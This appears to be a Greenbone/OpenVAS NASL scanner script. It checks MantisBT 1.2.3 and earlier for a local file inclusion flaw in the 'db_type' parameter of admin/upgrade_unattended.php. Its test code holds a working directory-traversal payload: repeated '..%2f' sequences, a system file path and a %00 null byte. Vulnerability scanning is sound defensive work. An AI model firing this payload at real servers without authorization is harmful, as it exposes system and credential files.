# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:mantisbt:mantisbt";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100947");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2010-12-15 13:36:34 +0100 (Wed, 15 Dec 2010)");
  script_cve_id("CVE-2010-4348", "CVE-2010-4349", "CVE-2010-4350");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");

  script_name("MantisBT <= 1.2.3 (db_type) Local File Inclusion Vulnerability");

  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4984.php");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45399");
  script_xref(name:"URL", value:"http://www.mantisbt.org/bugs/view.php?id=12607");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("gb_mantisbt_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("mantisbt/http/detected");

  script_tag(name:"summary", value:"MantisBT is prone to a local file-include vulnerability because it fails
  to properly sanitize user supplied input. MantisBT is also prone to a cross-site scripting (XSS) attack.");

  script_tag(name:"insight", value:"Input passed through the 'db_type' parameter (GET & POST) to
  upgrade_unattended.php script is not properly verified before being used to include files.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade
  to a newer release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + "/admin/upgrade_unattended.php?db_type=" + crap(data: "..%2f",length: 5 * 15) + files[file] + "%00";

  if (http_vuln_check(port: port, url: url, pattern: file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
